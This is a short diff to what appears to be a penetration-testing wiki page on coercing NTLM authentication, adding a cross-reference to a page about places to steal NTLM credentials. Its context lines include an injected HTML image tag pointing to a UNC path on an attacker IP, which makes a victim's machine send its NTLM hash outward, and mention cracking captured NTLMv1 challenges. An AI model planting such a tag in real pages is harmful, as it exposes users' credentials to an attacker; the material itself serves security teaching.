@@ -124,6 +124,12 @@ If you can perform a MitM attack to a computer and inject HTML in a page he will
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
 
+## Other ways to force and phish NTLM authentication
+
+{{#ref}}
+../ntlm/places-to-steal-ntlm-creds.md
+{{#endref}}
+
 ## Cracking NTLMv1
 
 If you can capture [NTLMv1 challenges read here how to crack them](../ntlm/index.html#ntlmv1-attack).\
